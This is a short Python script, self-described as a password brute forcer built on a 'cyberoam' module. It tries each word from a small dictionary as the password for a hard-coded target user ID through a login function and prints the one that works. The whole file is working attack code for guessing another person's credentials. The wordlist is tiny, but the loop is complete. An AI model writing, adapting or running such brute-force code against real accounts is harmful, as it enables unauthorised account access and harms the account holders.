# Password brute forcer based on Cyberoam.py
# copyright Abhinav Kumar

import cyberoam

target = '121228'
dictionary = ['aaj', 'adi', 'pol']


def main():
    for pwd in dictionary:
        if cyberoam.login(target, pwd, 0, 0) is True:
            print('Password for ' + target + ' is ' + pwd)
            return
        else:
            print('Password ' + pwd + ' failed. Trying again')


if __name__ == '__main__':
    main()
